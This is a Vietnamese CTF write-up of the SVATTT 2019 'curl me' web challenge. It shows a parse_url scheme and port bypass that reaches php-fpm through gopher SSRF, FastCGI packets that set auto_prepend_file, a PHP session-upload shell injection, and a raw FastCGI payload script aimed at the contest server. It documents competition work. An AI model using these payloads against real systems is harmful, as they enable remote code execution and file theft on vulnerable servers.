Xin chào, mình là `Vịnh (@vinhjaxt)`!

Vừa qua (03/11/2019), mình có tham gia cuộc thi SVATTT 2019 vòng sơ khảo, thuộc team `KMA PeBois`.

Sau đây, mình xin phép đại diện cho team, viết writeup bài web có tiêu đề `curl me`.

# Đề bài
```
Curl me
Source code: https://drive.google.com/file/d/10fXfOHVbtth28677oQ6Xxorgq5Tv3Dik/view
URL: http://125.235.240.170/
```

# Hint
Sau khi team mình giải được, btc cho hint, team sợ vô cùng :(
```
1. gopherus
```

# Source index.php
```php
<?php
if (isset($_GET["url"])) {
    $url = $_GET["url"];
    $parse = parse_url($url);

    if (isset($parse["scheme"]) && !in_array($parse["scheme"], array("file", "gopher"))) {
        if (!isset($parse["port"]) || $parse["port"] != 9000) {
            $path = urldecode(isset($parse["path"])?$parse["path"]:"");
            if (!preg_match("/flag/i", $path)) {
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_HEADER, false);
                $output = curl_exec($ch);
                curl_close($ch);
                die($output);
            }
        }
    }
    die("dont hack :)");
}
?>
<a href ="?url=https://pastebin.com/raw/jEwTz1cP">Curl flag</a>
```
Sau khi thấy 2 bài `curl 1` và `curl 2`, team mình nghĩ, `curl 1` sẽ phải làm cách nào đó để đọc file `/flag1` thông qua curl php.
Còn `/flag2`, muốn đọc được thì phải rce, liên quan đến php-fpm.
Hơn nữa, gần đây có cái CVE của php-fpm, chắc là cần dùng đến nó.

Với `curl 1`:
Để đọc được file `/flag1` thì ta phải bypass 2 thứ:
- parse_url với sheme được check không cho `file`, `gopher`: Cái này bypass khá đơn giản, team gửi url với scheme là `File` hay là `Gopher`
- `preg_match("/flag/i", $path)`: cái này thì coi như xong, trong suốt thời gian cuộc thi diễn ra, team mình vẫn chưa biết làm sao vượt được, sau khi kết thúc cuộc thi mới được share `File:///#/../flag1`

Với chiến lược: thôi thì đằng nào chả phải làm cái `curl 2`, làm được cái 2 rồi ăn cái 1 cũng được, team mình bắt đầu chuyển sang hướng khác.

Ban đầu, check với poc của CVE-2019-11043 (https://github.com/neex/phuip-fpizdam), không chạy.

Không sao! Chắc tác giả muốn các đội tìm hiểu sâu hơn vào cách poc hoạt động, team mình đọc blog của Orange (http://blog.orange.tw/) và improve poc: Không thành công (Sau khi kết thúc cuộc thi, mình đọc lại file cấu hình [quên tên rồi] trong thư mục /etc/nginx/snippets/ thì mới thấy nó check exists rồi, khá là không chú ý gây mất thời gian)

OK, không sao, còn nữa, port 9000, nếu mà vượt được thì chắc là hay ho =)).

Sau khi có tin nhắn `Ém flag à em =))`, mình thấy `PeBois` sắp thành `Phế Bois` rồi =)), bắt đầu fuzz lại cái parse_url hy vọng kiếm được chút đỉnh để vượt qua cơn khó khăn này.

Thật may mắn, payload `?url=Gopher:/127.0.0.1:9000`
với php:
```php
php > var_dump(parse_url("Gopher:/127.0.0.1:9000"));
array(2) {
  ["scheme"]=>
  string(6) "Gopher"
  ["path"]=>
  string(15) "/127.0.0.1:9000"
}
```
nhưng với curl:
```bash
$ curl 'Gopher:/127.0.0.1:9000' -v
*   Trying 127.0.0.1:9000...
* TCP_NODELAY set
* connect to 127.0.0.1 port 9000 failed: Connection refused
* Failed to connect to 127.0.0.1 port 9000: Connection refused
* Closing connection 0
```
Đến đây thì coi như toang (vượt được check port 9000), con đường thênh thang rộng mở mà rce vào thôi.

Để rce, team mình có 2 phương án:
- Thực hiện giống poc của CVE-2019-11043: Cách này đòi hỏi race condition quyết liệt
- Tham khảo poc CVE-2019-11043, thực hiện php session upload injection (cái này mình không biết gọi thế nào cho đúng :((, lấy từ ý tưởng lúc chơi `balsnctf`) và php-fpm (giống với SVATTT 2018 Quals của tác giả [@haxor](https://www.facebook.com/haxor.1337.xxx))

Không chần chừ, team mình chọn cách 2:

Đề thực hiện cách này, team mình cần:
- Một session của php
- Inject shell vào session đó bằng việc upload
- Include session đó sử dụng gopher để thay đổi setting auto_prepend_file của php-fpm và gọi shell

OK! Giải quyết từng vấn đề một:
- Để có được session, team mình sử dụng gopher, thay đổi setting `session.auto_start=1` của php-fpm

Sử dụng script (https://raw.githubusercontent.com/ONsec-Lab/scripts/master/fastcgipacket.rb) để gen với php-fpm params:
```ruby
packet << FCGIRecord::Params.new(1,
  "REQUEST_METHOD" => "GET",
  "SCRIPT_FILENAME" => "/var/www/html/index.php",
  "PHP_ADMIN_VALUE" => "session.auto_start=1"
).to_s
```
Sau khi gửi lên server, team mình có session của php `mhjuo9kbjf5fpkv0c2sk11mclo` (trả về dạng: `Set-Cookie: PHPSESSID=mhjuo9kbjf5fpkv0c2sk11mclo`)

- Để inject shell vào session này, team mình thực hiện upload liên tục lên server:
```js
      {
        method: 'POST',
        url: 'http://125.235.240.170/info.php?0=/var/lib/php/sessions/sess_mhjuo9kbjf5fpkv0c2sk11mclo',
        headers: {
          Connection: 'close',
          Cookie: 'PHPSESSID=mhjuo9kbjf5fpkv0c2sk11mclo'
        },
        formData: {
          PHP_SESSION_UPLOAD_PROGRESS: 'XXXXXvinhjaxtXXXXX',
          f: {
            value: `A`.repeat(100 * 1024),
            options: {
              filename: `<?php $v=chr(47).'getflag'; echo \`$v\`; ?>`, // Đọc flag2 nè
              contentType: 'image/jpeg'
            }
          }
        }
      }
```
- Để thực thi shell, team mình gửi request thay đổi `auto_prepend_file=/var/lib/php/sessions/sess_mhjuo9kbjf5fpkv0c2sk11mclo` của php-fpm

Thực hiện script fastcgipacket.rb với custom:
```ruby
packet << FCGIRecord::Params.new(1,
  "REQUEST_METHOD" => "GET",
  "SCRIPT_FILENAME" => "/var/www/html/index.php",
  "PHP_ADMIN_VALUE" => "auto_prepend_file=/var/lib/php/sessions/sess_mhjuo9kbjf5fpkv0c2sk11mclo"
).to_s
```
Sau đó gửi nhiều lần payload này lên server bằng cách chạy nhiều lần script sau (bằng tay :p):
```php
<?php
$out = "\x01\x01\x00\x01\x00\x08\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x04\x00\x01\x00\x93\x03\x00\x0e\x03\x52\x45\x51\x55\x45\x53\x54\x5f\x4d\x45\x54\x48\x4f\x44\x47\x45\x54\x0f\x17\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45\x2f\x76\x61\x72\x2f\x77\x77\x77\x2f\x68\x74\x6d\x6c\x2f\x69\x6e\x64\x65\x78\x2e\x70\x68\x70\x0f\x47\x50\x48\x50\x5f\x41\x44\x4d\x49\x4e\x5f\x56\x41\x4c\x55\x45\x61\x75\x74\x6f\x5f\x70\x72\x65\x70\x65\x6e\x64\x5f\x66\x69\x6c\x65\x3d\x2f\x76\x61\x72\x2f\x6c\x69\x62\x2f\x70\x68\x70\x2f\x73\x65\x73\x73\x69\x6f\x6e\x73\x2f\x73\x65\x73\x73\x5f\x6d\x68\x6a\x75\x6f\x39\x6b\x62\x6a\x66\x35\x66\x70\x6b\x76\x30\x63\x32\x73\x6b\x31\x31\x6d\x63\x6c\x6f\x00\x00\x00\x01\x04\x00\x01\x00\x00\x00\x00\x01\x05\x00\x01\x00\x00\x00\x00";
echo PHP_EOL,file_get_contents("http://125.235.240.170/index.php?url=".rawurlencode("Gopher:/127.0.0.1:9000/_".rawurlencode($out))), PHP_EOL;
```
Thật may mắn, trong một lần gửi lên, server trả về cho mình:
![](https://raw.githubusercontent.com/vinhjaxt/CTF-writeups/master/SVATTT-2019-Quals/Screenshot%20at%202019-11-03%2015-13-44.png)

Và một chút thay đổi để lấy được `/flag1`
```js
filename: `<?php $v=chr(47).'flag1'; echo file_get_contents($v); ?>`,
```
![](https://raw.githubusercontent.com/vinhjaxt/CTF-writeups/master/SVATTT-2019-Quals/Screenshot%20at%202019-11-03%2015-14-44.png)

OK, vậy là xong. Team mình khá vui và gỡ bỏ một số áp lực.
Cảm ơn các bạn/anh/chị/em đã theo dõi writeup, cảm ơn tác giả của challenge, cảm ơn team.
Nếu có góp ý, liên hệ, trao đổi, mọi người vui lòng liên lạc qua:
- Fb: http://fb.com/i.am.Ioser
- Discord: @vinhjaxt#2733
- Twitter: @vinhjaxt

# Tham khảo thêm
- https://www.zybuluo.com/shaobaobaoer/note/1214441
- http://blog.orange.tw/2019/10/an-analysis-and-thought-about-recently.html

# P/S
Sau khi mình chia sẻ bài writeup này, mình mới được khai sáng rằng cách làm của team mình khá là hardcore. Bạn đọc quan tâm cách làm đơn giản hơn vui lòng tham khảo: https://github.com/tarunkant/Gopherus

